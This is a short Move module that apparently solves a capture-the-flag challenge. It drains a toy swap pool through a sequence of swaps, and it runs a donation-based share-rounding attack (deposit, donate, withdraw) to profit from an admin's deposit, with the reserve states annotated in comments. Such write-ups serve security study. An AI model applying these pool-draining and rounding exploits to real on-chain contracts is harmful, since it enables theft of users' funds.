module solution::exploit {
    use challenge::swap::{Self, APT, TokenB};

    public entry fun solve(account: &signer) {
        // (A: 20, B: 20) (A: 6, B: 0)
        swap::swap<APT, TokenB>(account, 6, true);
        // (A: 26, B: 14) (A: 0, B: 6)
        swap::swap<APT, TokenB>(account, 6, false);
        // (A: 15, B: 20) (A: 11, B: 0)
        swap::swap<APT, TokenB>(account, 11, true);
        // (A: 26, B: 6) (A: 0, B: 14)
        swap::swap<APT, TokenB>(account, 6, false);
        // (A: 0, B: 12) (A: 26, B: 8)
    }

    public entry fun step1(account: &signer) {
        swap::claim(account);
        // supply: 0, asset: 0
        swap::deposit(account, 1);
        // supply: 1, asset: 1
        swap::donate(account, 4);
        // supply: 1, asset: 5
        // admin deposit 8
        // supply: 2, asset: 13
    }

    public entry fun step2(account: &signer) {
        // supply: 2, asset: 13
        swap::withdraw(account, 1);
        // supply: 1, asset: 7
    }
}
